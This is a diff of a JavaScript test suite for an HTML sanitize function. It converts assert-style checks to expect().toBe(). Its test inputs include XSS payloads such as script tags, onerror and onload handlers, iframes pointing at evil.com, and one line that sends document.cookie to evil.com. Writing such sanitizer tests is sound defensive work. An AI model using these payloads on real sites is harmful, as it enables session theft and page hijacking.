@@ -25,57 +25,57 @@ module.exports = defineCases({
 
     {
       name: 'strips-script-tags',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('<script>alert("xss")</script>hello');
-        assert.equal(result, 'hello', 'Should strip script tags');
+        expect(result, 'Should strip script tags').toBe('hello');
       },
     },
 
     {
       name: 'strips-img-onerror',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('<img src=x onerror="alert(1)">text');
-        assert.equal(result, 'text', 'Should strip img with onerror');
+        expect(result, 'Should strip img with onerror').toBe('text');
       },
     },
 
     {
       name: 'strips-nested-html-keeps-text',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('<div><b>bold</b> and <i>italic</i></div>');
-        assert.equal(result, 'bold and italic', 'Should strip all tags but keep text');
+        expect(result, 'Should strip all tags but keep text').toBe('bold and italic');
       },
     },
 
     {
       name: 'trims-whitespace',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('  hello world  ');
-        assert.equal(result, 'hello world', 'Should trim');
+        expect(result, 'Should trim').toBe('hello world');
       },
     },
 
     {
       name: 'strips-and-trims-together',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('  <b>hello</b>  ');
-        assert.equal(result, 'hello', 'Should strip tags and trim');
+        expect(result, 'Should strip tags and trim').toBe('hello');
       },
     },
 
     {
       name: 'clean-string-unchanged',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('just plain text');
-        assert.equal(result, 'just plain text', 'Clean string should pass through');
+        expect(result, 'Clean string should pass through').toBe('just plain text');
       },
     },
 
     {
       name: 'empty-string-unchanged',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('');
-        assert.equal(result, '', 'Empty string should remain empty');
+        expect(result, 'Empty string should remain empty').toBe('');
       },
     },
 
@@ -83,29 +83,29 @@ module.exports = defineCases({
 
     {
       name: 'null-returns-null',
-      async run({ assert }) {
-        assert.equal(utilities.sanitize(null), null, 'null should pass through');
+      async run({ expect }) {
+        expect(utilities.sanitize(null), 'null should pass through').toBe(null);
       },
     },
 
     {
       name: 'undefined-returns-undefined',
-      async run({ assert }) {
-        assert.equal(utilities.sanitize(undefined), undefined, 'undefined should pass through');
+      async run({ expect }) {
+        expect(utilities.sanitize(undefined), 'undefined should pass through').toBe(undefined);
       },
     },
 
     {
       name: 'number-passes-through',
-      async run({ assert }) {
-        assert.equal(utilities.sanitize(42), 42, 'Numbers should pass through');
+      async run({ expect }) {
+        expect(utilities.sanitize(42), 'Numbers should pass through').toBe(42);
       },
     },
 
     {
       name: 'boolean-passes-through',
-      async run({ assert }) {
-        assert.equal(utilities.sanitize(true), true, 'Booleans should pass through');
+      async run({ expect }) {
+        expect(utilities.sanitize(true), 'Booleans should pass through').toBe(true);
       },
     },
 
@@ -113,21 +113,21 @@ module.exports = defineCases({
 
     {
       name: 'flat-object-sanitizes-all-strings',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize({
           name: '<b>Evil Corp</b>',
           count: 5,
           active: true,
         });
-        assert.equal(result.name, 'Evil Corp', 'Should strip HTML from name');
-        assert.equal(result.count, 5, 'Number should pass through');
-        assert.equal(result.active, true, 'Boolean should pass through');
+        expect(result.name, 'Should strip HTML from name').toBe('Evil Corp');
+        expect(result.count, 'Number should pass through').toBe(5);
+        expect(result.active, 'Boolean should pass through').toBe(true);
       },
     },
 
     {
       name: 'deeply-nested-object-sanitizes',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize({
           settings: {
             brand: {
@@ -137,9 +137,9 @@ module.exports = defineCases({
             enabled: true,
           },
         });
-        assert.equal(result.settings.brand.name, 'Acme', 'Should strip deep nested script');
-        assert.equal(result.settings.brand.about, 'We sell stuff', 'Should strip deep nested img');
-        assert.equal(result.settings.enabled, true, 'Deep boolean should pass through');
+        expect(result.settings.brand.name, 'Should strip deep nested script').toBe('Acme');
+        expect(result.settings.brand.about, 'Should strip deep nested img').toBe('We sell stuff');
+        expect(result.settings.enabled, 'Deep boolean should pass through').toBe(true);
       },
     },
 
@@ -147,34 +147,34 @@ module.exports = defineCases({
 
     {
       name: 'array-sanitizes-each-string',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize(['<b>one</b>', 'two', '<script>x</script>three']);
-        assert.equal(result[0], 'one', 'First element stripped');
-        assert.equal(result[1], 'two', 'Clean element unchanged');
-        assert.equal(result[2], 'three', 'Third element stripped');
+        expect(result[0], 'First element stripped').toBe('one');
+        expect(result[1], 'Clean element unchanged').toBe('two');
+        expect(result[2], 'Third element stripped').toBe('three');
       },
     },
 
     {
       name: 'array-of-objects',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize([
           { name: '<b>Alice</b>' },
           { name: '<i>Bob</i>' },
         ]);
-        assert.equal(result[0].name, 'Alice', 'First object name stripped');
-        assert.equal(result[1].name, 'Bob', 'Second object name stripped');
+        expect(result[0].name, 'First object name stripped').toBe('Alice');
+        expect(result[1].name, 'Second object name stripped').toBe('Bob');
       },
     },
 
     {
       name: 'mixed-array-types',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize(['<b>text</b>', 42, null, true]);
-        assert.equal(result[0], 'text', 'String stripped');
-        assert.equal(result[1], 42, 'Number passed through');
-        assert.equal(result[2], null, 'null passed through');
-        assert.equal(result[3], true, 'Boolean passed through');
+        expect(result[0], 'String stripped').toBe('text');
+        expect(result[1], 'Number passed through').toBe(42);
+        expect(result[2], 'null passed through').toBe(null);
+        expect(result[3], 'Boolean passed through').toBe(true);
       },
     },
 
@@ -182,29 +182,29 @@ module.exports = defineCases({
 
     {
       name: 'xss-event-handler',
-      async run({ assert }) {
-        assert.equal(utilities.sanitize('<div onmouseover="alert(1)">hover me</div>'), 'hover me');
+      async run({ expect }) {
+        expect(utilities.sanitize('<div onmouseover="alert(1)">hover me</div>')).toBe('hover me');
       },
     },
 
     {
       name: 'xss-iframe',
-      async run({ assert }) {
-        assert.equal(utilities.sanitize('<iframe src="evil.com"></iframe>safe'), 'safe');
+      async run({ expect }) {
+        expect(utilities.sanitize('<iframe src="evil.com"></iframe>safe')).toBe('safe');
       },
     },
 
     {
       name: 'xss-svg-onload',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize('<svg onload="alert(1)">test</svg>');
-        assert.equal(result.includes('onload'), false, 'Should not contain onload');
+        expect(result.includes('onload'), 'Should not contain onload').toBe(false);
       },
     },
 
     {
       name: 'xss-full-agent-creation-payload',
-      async run({ assert }) {
+      async run({ expect }) {
         const result = utilities.sanitize({
           name: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">Agent',
           welcomeMessage: 'Hello <script>document.location="https://evil.com"</script>',
@@ -213,10 +213,10 @@ module.exports = defineCases({
             about: '<iframe src="https://evil.com"></iframe>About us',
           },
         });
-        assert.equal(result.name, 'Agent', 'name should be clean');
-        assert.equal(result.welcomeMessage.includes('<script>'), false, 'welcomeMessage should not have script');
-        assert.equal(result.brand.name.includes('<script>'), false, 'brand.name should not have script');
-        assert.equal(result.brand.about, 'About us', 'brand.about should be clean');
+        expect(result.name, 'name should be clean').toBe('Agent');
+        expect(result.welcomeMessage.includes('<script>'), 'welcomeMessage should not have script').toBe(false);
+        expect(result.brand.name.includes('<script>'), 'brand.name should not have script').toBe(false);
+        expect(result.brand.about, 'brand.about should be clean').toBe('About us');
       },
     },
   ],
